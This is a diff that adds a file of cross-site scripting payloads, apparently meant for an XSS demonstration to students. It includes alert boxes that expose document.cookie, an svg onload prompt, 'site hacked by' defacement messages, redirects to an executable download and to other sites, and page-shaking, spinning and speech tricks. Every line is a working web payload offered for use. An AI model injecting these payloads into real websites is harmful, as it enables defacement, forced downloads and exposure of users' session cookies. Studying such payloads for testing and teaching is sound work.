@@ -1,0 +1,26 @@
+<script>alert("1")</script>
+
+<script>alert(document.cookie)</script>
+
+<svg/onload=prompt(0)//
+
+
+<script>alert("Hacked_By_AWS_66")</script>
+
+<script>alert("this_site_hacked_by_Faruk")</script>
+
+<script>alert(document.cookie)</script>
+
+<script> window.location.href = "https://www.voidtools.com/Everything-1.4.1.1032.x86-Setup.exe"; </script>
+
+<script>location.href="https://arenawebsecurity.net/diploma-in-cyber-security";</script>
+
+<script>location.href="https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
+
+<script>setInterval(() => {document.body.style.transform = "rotate("+(Math.random()*2 - 1)+"deg) translate("+(Math.random()*10 - 5)+"px,"+(Math.random()*10 - 5)+"px)";}, 50);</script>
+
+<style> @keyframes spin{to{transform:rotate(360deg)}} body{animation:spin 2s linear infinite} </style>
+
+<script> alert("Page hacked with XSS 🎨");  document.body.style.background="linear-gradient(45deg, red, yellow)"; </script>
+
+<script>speechSynthesis.speak(new SpeechSynthesisUtterance("Hello Students! This is X S S demo!"));</script>
